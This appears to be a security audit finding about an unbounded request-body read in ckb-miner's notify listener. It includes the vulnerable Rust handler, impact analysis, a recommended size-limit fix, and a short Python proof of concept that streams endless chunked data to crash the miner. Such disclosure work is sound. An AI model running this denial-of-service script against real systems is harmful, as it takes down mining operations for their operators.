### Title
Unbounded HTTP Request Body Collection in `ckb-miner` Notify Listener Allows RAM Exhaustion DoS — (`File: miner/src/client.rs`)

### Summary

When `ckb-miner` is configured in "listen notify mode," it binds an HTTP server to accept block template push notifications from the CKB node's block assembler. The request handler collects the entire incoming HTTP request body into memory with no size limit and no read timeout. Any network peer that can reach the miner's listen port can POST an arbitrarily large body, exhausting the miner's RAM and crashing the process.

### Finding Description

The `ckb-miner` binary supports two modes for receiving block templates: polling and "listen notify mode." In notify mode, the miner binds a TCP listener and the CKB node's block assembler POSTs new block templates to it.

The HTTP request handler for this listener is the `handle()` function in `miner/src/client.rs`:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

`BodyExt::collect(req).await?.aggregate()` reads the **entire** incoming request body into a contiguous in-memory buffer before any processing. There is no call to `http_body_util::Limited` or any equivalent size cap, and no read timeout is applied to the body streaming phase. The hyper server itself (`auto::Builder`) applies no body size limit either. [1](#0-0) 

The listener is started unconditionally when `listen` is set in the miner config: [2](#0-1) 

The `listen` field is a supported, documented configuration option of type `Option<SocketAddr>` in `ClientConfig`: [3](#0-2) 

The configuration template explicitly shows how to enable it: [4](#0-3) 

When the operator sets `listen = "0.0.0.0:8888"` (or any non-loopback address), the listener is reachable by any network peer. The server spawns a new task per accepted connection with no connection-level body limit: [5](#0-4) 

### Impact Explanation

An attacker who can reach the miner's listen port sends an HTTP POST with an arbitrarily large body (e.g., gigabytes of data). The `BodyExt::collect` call streams all of it into RAM. Because there is no size cap and no read timeout on the body, the miner process exhausts available memory, triggering OOM termination or undefined behavior. With the miner down, no new blocks are submitted to the CKB node, halting mining operations for the operator.

### Likelihood Explanation

The `listen` notify mode is a documented, supported feature. Operators running high-performance mining setups are likely to use it (it avoids polling latency). If the listen address is bound to a non-loopback interface — which is necessary when the miner and node run on separate machines — the endpoint is reachable by any network peer without authentication. No special role, key, or protocol knowledge is required; a plain HTTP POST suffices.

### Recommendation

Apply a body size limit using `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    const MAX_BODY: u64 = 10 * 1024 * 1024; // 10 MiB, matching RPC server default
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    ...
}
```

Additionally, apply a per-connection read timeout via `hyper_util`'s connection builder or `tokio::time::timeout` wrapping the entire `conn.await` to guard against slow-loris style attacks.

The CKB node's RPC server already enforces `max_request_body_size` (default 10 MiB): [6](#0-5) 

The miner's notify listener should apply the same discipline.

### Proof of Concept

Prerequisites: `ckb-miner` configured with `listen = "0.0.0.0:8888"` in `ckb-miner.toml`.

```bash
# Stream ~20 GB of data to the miner's notify listener
# The miner will buffer all of it into RAM before processing
python3 -c "
import socket, time
s = socket.socket()
s.connect(('TARGET_IP', 8888))
# Send HTTP headers
s.send(b'POST / HTTP/1.1\r\nHost: target\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n')
# Stream chunked data indefinitely
chunk = ('1000\r\n' + 'A' * 4096 + '\r\n').encode()
while True:
    s.send(chunk)
"
```

The miner process will accumulate all received bytes in the buffer returned by `BodyExt::collect`. RAM usage grows until the OS kills the process or the system becomes unresponsive. The CKB node continues running but receives no block submissions, halting mining.
